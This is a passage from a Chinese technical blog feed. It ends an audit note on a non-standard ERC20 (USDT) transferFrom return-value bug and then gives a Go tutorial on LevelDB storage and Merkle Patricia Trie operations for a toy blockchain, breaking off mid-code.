USDT 这类非标准 ERC20 代币，即使它们已被加入支持列表中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第 238-241 行</span><br><span class="line">require(  </span><br><span class="line">    IERC20(fromToken).transferFrom(msg.sender, address(this), amount),   </span><br><span class="line">    &quot;INSUFFICIENT AMOUNT: ERC20 TRANSFER FROM FAILED&quot;  </span><br><span class="line">);  </span><br><span class="line"></span><br><span class="line">// 第 316-319 行</span><br><span class="line">require(  </span><br><span class="line">    IERC20(fromToken).transferFrom(msg.sender, address(this), amount),   </span><br><span class="line">    &quot;INSUFFICIENT AMOUNT: ERC20 TRANSFER FROM FAILED&quot;  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在 depositAndCall 函数中，协议调用 IERC20.transferFrom 试图将用户的代币转入合约中。但部分非标准 ERC20 代币（比如 USDT）在实现 transfer 或 transferFrom 方法时，没有返回布尔值（bool），违反了 ERC20 的标准。</p><p>由于 require(…) 表达式期望该调用返回 true，而 USDT 的调用会直接返回空值（无返回），因此 require 判断为 false，从而导致整个交易失败。</p><h2 id="池子创造没有进行检查条件，"><a href="#池子创造没有进行检查条件，" class="headerlink" title="池子创造没有进行检查条件，"></a>池子创造没有进行检查条件，</h2><p>这个漏洞我发现了，但是由于影响写错了，不符合它们给的规定，下次一定要写规整点，这个漏洞错过太可惜了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单机版区块链的实现</title>
      <link href="/2025/06/16/%E5%8D%95%E6%9C%BA%E7%89%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/06/16/%E5%8D%95%E6%9C%BA%E7%89%88%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="单机版区块链的实现"><a href="#单机版区块链的实现" class="headerlink" title="单机版区块链的实现"></a>单机版区块链的实现</h1><p>全部代码都已开源在git上 <a href="https://github.com/HeYuan-33/hyblockchain">hyblockchain</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>开始之前，首先要了解一些基础知识,这里简单的介绍一下</p><h3 id="区块链的结构"><a href="#区块链的结构" class="headerlink" title="区块链的结构"></a>区块链的结构</h3><p><strong>区块（Block）</strong>包含：<br><strong>区块头（Block Header）：</strong>包含前一个区块哈希、Merkle 根、时间戳、随机数等<br><strong>交易列表（Transactions）：</strong>每个区块中打包的所有交易<br><strong>链（Chain）：</strong>每个区块通过 previousHash 指向前一个区块形成链</p><h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p><strong>作用：</strong>确保数据完整性、防篡改<br><strong>常用：</strong>SHA256（Bitcoin）、Keccak256（Ethereum）<br>本实验使用的是SHA256</p><h3 id="交易系统"><a href="#交易系统" class="headerlink" title="交易系统"></a>交易系统</h3><ol><li><p><strong>交易结构（Transaction）</strong></p><ul><li>发送方地址、接收方地址、金额、签名（可选）</li><li>交易池（Mempool）：待打包的交易集合</li></ul></li><li><p><strong>简单账户模型或UTXO模型</strong></p><ul><li>账户模型（如 Ethereum）：记录每个地址的余额</li><li>UTXO 模型（如 Bitcoin）：每个未花费输出作为新交易输入</li></ul></li></ol><h3 id="状态树-MPT"><a href="#状态树-MPT" class="headerlink" title="状态树 MPT"></a>状态树 MPT</h3><p>使用的是key,value来实现</p><p><strong>叶子节点</strong>：实际存放值的节点<br><strong>分支节点</strong>：有16个子节点，用来指向多条路径<br><strong>扩展节点</strong>：存储公共前缀，它的下一节点只能是分支节点</p><h3 id="数据的持久化"><a href="#数据的持久化" class="headerlink" title="数据的持久化"></a>数据的持久化</h3><p>如LevelDB、BoltDB 等</p><ul><li>区块数据、交易池、状态等写入数据库</li><li>简单项目可以先用文件系统或内存</li></ul><h2 id="数据库的实现"><a href="#数据库的实现" class="headerlink" title="数据库的实现"></a>数据库的实现</h2><p>使用LevelDB数据库，由Google LevelDB 的GO版本实现    <code>github.com/syndtr/goleveldb/leveldb</code>，用LevelDB封装模块，实现自定义的接口kvstore.KVStore</p><blockquote><p>leveldb 是 kvstore 接口的一种具体实现，为了解耦，适应不同的后端，如：Redis,InMemoryDB等</p></blockquote><h3 id="首先定义kvstore接口"><a href="#首先定义kvstore接口" class="headerlink" title="首先定义kvstore接口"></a>首先定义kvstore接口</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> kvstore</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// KVStore 定义了键值存储的接口</span></span><br><span class="line"><span class="keyword">type</span> KVStore <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">Get(key []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">Put(key []<span class="type">byte</span>, value []<span class="type">byte</span>) <span class="type">error</span></span><br><span class="line">Delete(key []<span class="type">byte</span>) <span class="type">error</span></span><br><span class="line">Has(key []<span class="type">byte</span>) (<span class="type">bool</span>, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量操作</span></span><br><span class="line">Batch() Batch</span><br><span class="line">Write(batch Batch) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代器</span></span><br><span class="line">NewIterator(prefix []<span class="type">byte</span>) Iterator</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭存储</span></span><br><span class="line">io.Closer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Batch 定义了批量操作的接口</span></span><br><span class="line"><span class="keyword">type</span> Batch <span class="keyword">interface</span> &#123;</span><br><span class="line">Put(key []<span class="type">byte</span>, value []<span class="type">byte</span>)</span><br><span class="line">Delete(key []<span class="type">byte</span>)</span><br><span class="line">Reset()</span><br><span class="line">Len() <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Iterator 定义了迭代器的接口</span></span><br><span class="line"><span class="keyword">type</span> Iterator <span class="keyword">interface</span> &#123;</span><br><span class="line">Next() <span class="type">bool</span></span><br><span class="line">Key() []<span class="type">byte</span></span><br><span class="line">Value() []<span class="type">byte</span></span><br><span class="line">Error() <span class="type">error</span></span><br><span class="line">Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="用LeveLDB进行封装（实现里面的接口方法）"><a href="#用LeveLDB进行封装（实现里面的接口方法）" class="headerlink" title="用LeveLDB进行封装（实现里面的接口方法）"></a>用LeveLDB进行封装（实现里面的接口方法）</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> leveldb</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/syndtr/goleveldb/leveldb&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/syndtr/goleveldb/leveldb/iterator&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/syndtr/goleveldb/leveldb/util&quot;</span></span><br><span class="line"><span class="string">&quot;hyblockchain/kvstore&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// LevelDB 实现了KVStore接口</span></span><br><span class="line"><span class="keyword">type</span> LevelDB <span class="keyword">struct</span> &#123;</span><br><span class="line">db *leveldb.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewLevelDB 创建一个新的LevelDB实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewLevelDB</span><span class="params">(path <span class="type">string</span>)</span></span> (kvstore.KVStore, <span class="type">error</span>) &#123;</span><br><span class="line">db, err := leveldb.OpenFile(path, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;LevelDB&#123;db: db&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get 获取指定键的值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Get(key []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> l.db.Get(key, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Put 存储键值对</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Put(key, value []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> l.db.Put(key, value, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete 删除指定键</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Delete(key []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> l.db.Delete(key, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Has 检查键是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Has(key []<span class="type">byte</span>) (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> l.db.Has(key, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Batch 创建新的批量操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Batch() kvstore.Batch &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;levelDBBatch&#123;</span><br><span class="line">batch: <span class="built_in">new</span>(leveldb.Batch),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write 执行批量操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Write(batch kvstore.Batch) <span class="type">error</span> &#123;</span><br><span class="line">b, ok := batch.(*levelDBBatch)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> l.db.Write(b.batch, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewIterator 创建新的迭代器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> NewIterator(prefix []<span class="type">byte</span>) kvstore.Iterator &#123;</span><br><span class="line">iter := l.db.NewIterator(util.BytesPrefix(prefix), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">return</span> &amp;levelDBIterator&#123;iter: iter&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close 关闭数据库连接</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LevelDB)</span></span> Close() <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> l.db.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// levelDBBatch 实现了Batch接口</span></span><br><span class="line"><span class="keyword">type</span> levelDBBatch <span class="keyword">struct</span> &#123;</span><br><span class="line">batch *leveldb.Batch</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *levelDBBatch)</span></span> Put(key, value []<span class="type">byte</span>) &#123;</span><br><span class="line">b.batch.Put(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *levelDBBatch)</span></span> Delete(key []<span class="type">byte</span>) &#123;</span><br><span class="line">b.batch.Delete(key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *levelDBBatch)</span></span> Reset() &#123;</span><br><span class="line">b.batch.Reset()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *levelDBBatch)</span></span> Len() <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> b.batch.Len()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// levelDBIterator 实现了Iterator接口</span></span><br><span class="line"><span class="keyword">type</span> levelDBIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">iter iterator.Iterator</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *levelDBIterator)</span></span> Next() <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i.iter.Next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *levelDBIterator)</span></span> Key() []<span class="type">byte</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i.iter.Key()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *levelDBIterator)</span></span> Value() []<span class="type">byte</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i.iter.Value()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *levelDBIterator)</span></span> Error() <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> i.iter.Error()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *levelDBIterator)</span></span> Release() &#123;</span><br><span class="line">i.iter.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MPT，储存状态"><a href="#MPT，储存状态" class="headerlink" title="MPT，储存状态"></a>MPT，储存状态</h2><p>mpt是默克尔树，用来存储状态，它的结构分为：叶子节点，分支节点，扩展节点，使用key,value对来实现</p><h3 id="叶子节点，扩展节点，分支节点"><a href="#叶子节点，扩展节点，分支节点" class="headerlink" title="叶子节点，扩展节点，分支节点"></a>叶子节点，扩展节点，分支节点</h3><p>开始实现mpt的时候，首先要定义好它的三种节点，一个node节点是由一个结构体实现的，那么这个结构体包含哪些呢？</p><p>首先肯定有节点类型<code>（nodetype），key,value</code>(仅叶子节点使用)<br>那么考虑到分支节点是拥有16个子节点的数组（为什么分支节点是16子节点，可以在niblle篇章找到答案），所以还得有个16长度大小的数组，同时这个当数组索引为零时，就可以给扩展节点使用作为它的下一个节点。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> NodeType <span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">BranchNode    NodeType = <span class="number">0</span></span><br><span class="line">ExtensionNode NodeType = <span class="number">1</span></span><br><span class="line">LeafNode      NodeType = <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Node 表示MPT中的一个节点</span></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">Type     NodeType  <span class="comment">// 节点类型</span></span><br><span class="line">Key      []<span class="type">byte</span>    <span class="comment">// 压缩路径（用于扩展/叶子节点）</span></span><br><span class="line">Value    []<span class="type">byte</span>    <span class="comment">// 存储值（仅叶子节点用）</span></span><br><span class="line">Children [<span class="number">16</span>]*Node <span class="comment">// 子节点数组（仅分支节点使用）</span></span><br><span class="line">Hash     []<span class="type">byte</span>    <span class="comment">// 当前节点的哈希（默认为 nil，需外部生成）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来还要实现创建这三种节点的函数，根据结构体的内容，很好实现的，比如创建一个分支节点</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NewBranchNode 创建一个新的分支节点</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBranchNode</span><span class="params">()</span></span> *Node &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Node&#123;</span><br><span class="line">Type:     BranchNode,</span><br><span class="line">Children: [<span class="number">16</span>]*Node&#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>从上面可知，我们的节点是结构体，那又怎样实现key value呢，通过序列化来实现。</p><p>序列化：就是把一个结构体（如一个节点 Node）转成一串 字节（[]byte），可以存入数据库或通过网络传输。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MPT)</span></span> serializeNode(n *Node) []<span class="type">byte</span></span><br></pre></td></tr></table></figure><p>它做的就是把不同类型的节点（Leaf &#x2F; Extension &#x2F; Branch）变成字节流，以便后续：</p><ul><li>写入 LevelDB（db.Put(hash, bytes)）</li><li>或用于计算哈希（hashNode()）</li></ul><p>叶子节点的序列化：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> LeafNode:</span><br><span class="line">buf.Write(n.Key)    <span class="comment">// 写入 Key（注意是 nibbles 格式）</span></span><br><span class="line">buf.Write(n.Value)  <span class="comment">// 写入 Value</span></span><br></pre></td></tr></table></figure><p><strong>格式：</strong>[Type&#x3D;2] [Key…] [Value…]</p><p>扩展节点的序列化：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> ExtensionNode:</span><br><span class="line">buf.Write(n.Key)              <span class="comment">// 路由部分 key（是 nibble 数组）</span></span><br><span class="line">buf.Write(n.Children[<span class="number">0</span>].Hash) <span class="comment">// 连接的下一个节点的哈希</span></span><br></pre></td></tr></table></figure><p><strong>格式：</strong>[Type&#x3D;1] [Key…] [Child.Hash]（32 字节）</p><blockquote><p>Extension 节点只保存路径和“下一跳”的指针（哈希）</p></blockquote><p>分支节点的序列化：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BranchNode:</span><br><span class="line"><span class="keyword">for</span> _, child := <span class="keyword">range</span> n.Children &#123;</span><br><span class="line"><span class="keyword">if</span> child != <span class="literal">nil</span> &#123;</span><br><span class="line">buf.Write(child.Hash)              <span class="comment">// 写入子节点的哈希</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">buf.Write(<span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">32</span>))       <span class="comment">// 空位写入32个 0 占位</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> n.Value != <span class="literal">nil</span> &#123;</span><br><span class="line">buf.Write(n.Value) <span class="comment">// 如果该分支节点自身存了值（如 key 正好在这里结束），也写入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>格式：</strong><br>[Type&#x3D;0]<br>[Child0.Hash (32字节)]<br>[Child1.Hash (32字节)]<br>…<br>[Child15.Hash (32字节)]<br>[Value（可选）]</p><p><code>serializeNode()</code> 就是把节点对象 ➜ 转成固定格式的 <code>byte slice</code>，便于存储与计算哈希。</p><p><strong>不同类型节点序列化格式不同，必须带类型标识，以便未来可以反序列化。</strong></p><h3 id="niblle"><a href="#niblle" class="headerlink" title="niblle"></a>niblle</h3><p>一个byte是8位，所以一个分支节点就要有256个子节点，很浪费内存，而我们使用nibble代表半个字节(4位)，刚好是16个子节点，正好与我们设计的分支节点有16个子节点对应</p><blockquote><p>每一层的分支就是根据下一个 nibble 值来决定走哪个方向。</p></blockquote><p>举例来说：</p><ul><li>key :&#x3D; []byte(“a”)        </li><li>“a” 的 ASCII 是 0x61，二进制是 01100001</li><li>第一个nibble是0110&#x3D;6，第二个nibble是0001&#x3D;1</li><li>nibbles &#x3D; [6, 1]   &#x2F;&#x2F; 因为 0x61 的高 4 位是 6，低 4 位是 1</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bytesToNibbles</span><span class="params">(b []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">nibbles := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(b)*<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> b &#123;</span><br><span class="line">nibbles[i*<span class="number">2</span>] = v &gt;&gt; <span class="number">4</span>         <span class="comment">// 高四位</span></span><br><span class="line">nibbles[i*<span class="number">2</span>+<span class="number">1</span>] = v &amp; <span class="number">0x0f</span>     <span class="comment">// 低四位</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nibbles</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码解释</span></span><br><span class="line">nibbles[i*<span class="number">2</span>]     = v &gt;&gt; <span class="number">4</span>     <span class="comment">// 0110 0001 &gt;&gt; 4 = 0000 0110 = 0x06 = 6</span></span><br><span class="line">nibbles[i*<span class="number">2</span> + <span class="number">1</span>] = v &amp; <span class="number">0x0f</span>   <span class="comment">// 0110 0001 &amp; 0000 1111 = 0000 0001 = 0x01 = 1</span></span><br></pre></td></tr></table></figure><h3 id="计算公共前缀"><a href="#计算公共前缀" class="headerlink" title="计算公共前缀"></a>计算公共前缀</h3><p>找出两个字节数组（通常是两个 key 路径）前面有多少个字节是相同的，即它们的“最长公共前缀”有多长，我们构建一个树，有共同前缀的就用扩展节点存储，也是为了方便查找插入与节点的公共前缀.</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">commonPrefix</span><span class="params">(a, b []<span class="type">byte</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i &lt; <span class="built_in">len</span>(a) &amp;&amp; i &lt; <span class="built_in">len</span>(b) &amp;&amp; a[i] == b[i] &#123;</span><br><span class="line">i++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是mpt的核心辅助函数，接下来介绍核心操作了，mpt中的增删查改</p><h3 id="get-从mpt中获取值"><a href="#get-从mpt中获取值" class="headerlink" title="get 从mpt中获取值"></a>get 从mpt中获取值</h3><p>查找一个值，我们是从上往下的递归查找每次比较当前节点能否匹配 key 的前缀，然后继续递归，每次都会“缩短 key”，最终 key 用光后，如果节点匹配成功，就找到；否则失败</p><p>首先获取插入key的niblle数组，沿着 nibble 数组去穿越这棵树</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get 从MPT中获取值</span><br><span class="line">func (m *MPT) Get(key []byte) ([]byte, error) &#123;</span><br><span class="line">nibbles := bytesToNibbles(key)</span><br><span class="line">return m.get(m.root, nibbles)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心函数是<code>get()</code>,传入<code>m.root</code>(根节点进行递归查找)，<code>niblle</code>我们要查询的路径<br>在get函数中判断节点类型（前置条件是传入的节点不为空）<br><strong>匹配到叶子节点</strong></p><ul><li>说明这是该路径的最后，就不做递归调用，直接判断是否相等<ul><li>相等就代表已找到，返回value.</li><li>不相等返回错误信息</li></ul></li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> n.Type &#123;</span><br><span class="line"><span class="keyword">case</span> LeafNode:</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(n.Key, key) &#123;</span><br><span class="line"><span class="keyword">return</span> n.Value, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;key not found&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>匹配到扩展节点</strong><br>扩展节点是存储公共路径的节点</p><ul><li>有俩种情况返回错误信息<ul><li>key的长度小于n.key，说明接下来没有路径可以继续计较查找下去了</li><li>key与n.key的公共前缀不相等，说明此时没有与所查找的节点路径一致</li></ul></li><li>当以上俩种情况都不存在，则继续进行递归调用，匹配下一个节点</li><li>此时get的参数有所改变。<code>n.Childern[0]</code>是该扩展节点的下一个孩子节点，<code>key[len(n.Key):]</code>则是继续匹配除去扩展节点的路径</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> ExtensionNode:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; <span class="built_in">len</span>(n.Key) || !bytes.Equal(n.Key, key[:<span class="built_in">len</span>(n.Key)]) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;key not found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> m.get(n.Children[<span class="number">0</span>], key[<span class="built_in">len</span>(n.Key):])</span><br></pre></td></tr></table></figure><p><strong>匹配到分支节点</strong><br>找key[]数组的第一位<code>（key[0]）</code>与分支节点匹配，继续向下递归查找</p><ul><li>只要key还存在，就继续递归匹配，如果刚好匹配完了key的路径<code>len（key）= 0</code>，就可直接返回value,因为已经找到</li><li>都不满足以上所述，就继续递归下去，接着找</li><li>此时的get参数，<code>n.Children[key[0]]</code>，沿着这个分支节点继续找，对应的我们的参数<code>key[1:]</code>,也要去除分支节点即找到的<code>key[0]</code><ul><li>get(n, [2, 3, 5])</li><li>n.Type &#x3D;&#x3D; BranchNode，那么key[0] &#x3D;&#x3D; 2</li><li>于是我们去 n.Children[2] 找</li><li>调用下一层：get(n.Children[2], [3, 5])</li></ul></li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BranchNode:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> n.Value, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> m.get(n.Children[key[<span class="number">0</span>]], key[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>以上三种查找值，已经介绍完，接下来介绍<strong>mpt中delete</strong></p><h3 id="delete-从MPT中删除键值对"><a href="#delete-从MPT中删除键值对" class="headerlink" title="delete 从MPT中删除键值对"></a>delete 从MPT中删除键值对</h3><p>我们的删除逻辑，还是一样获取要删除的key的niblle数组，是从底向上查找，进行递归，这与get的查找逻辑是相反的<br>它不是向我们平常一样写代码，直接删除，而是通过return n, nil （并不意味着结构没变）递归地构建新的树结构，从底向上逐层返回。最终返回<strong>newRoot</strong> 是修改后树的新根。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MPT)</span></span> Delete(key []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">nibbles := bytesToNibbles(key)</span><br><span class="line">newRoot, err := m.<span class="built_in">delete</span>(m.root, nibbles)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">m.root = newRoot</span><br><span class="line"><span class="keyword">return</span> m.commit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在delete的函数中，还是先要判断节点类型，从最简单的叶子节点开始梳理逻辑</p><p><strong>匹配到是叶子节点</strong><br>路径相等，返回nil,表示要被删除了</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> n.Type &#123;</span><br><span class="line"><span class="keyword">case</span> LeafNode:</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(n.Key, key) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>匹配到是扩展节点</strong></p><ul><li><p>首先看是否与扩展节点相匹配，如果不是，则原路返回</p></li><li><p>再进行递归查找，调用<code>child, err := m.delete(n.Children[0], key[len(n.Key):])</code><br>从前可知，扩展节点下一个节点必须是分支节点,所以在递归后，分支节点的逻辑非常关键，所以先来介绍一下<br><strong>匹配到分支节点</strong><br>无论时扩展节点递归到分支节点，还是直接匹配到分支分支节点，都必须考虑删除分支节点对应的叶子节点后，是否要考虑压缩，就比如，分支节点刚好有俩个有效叶子节点，删除其中一个后，剩下那个就要考虑与分支节点或者前面还有扩展节点进行一个压缩为一个叶子节点，其核心是路径压缩</p></li><li><p>首先判断key是否被消耗完了</p><ul><li>如果 key 已经消费完<code>（len(key)==0）</code>，说明当前分支节点对应的路径上有一个值，删除它（设为 nil）</li><li>否则取出 key 的第一个 <code>nibble（key[0]）</code>，递归去对应的子节点里继续删除，删除后将子节点更新</li></ul></li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BranchNode:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span> &#123;</span><br><span class="line">n.Value = <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">child, err := m.<span class="built_in">delete</span>(n.Children[key[<span class="number">0</span>]], key[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span 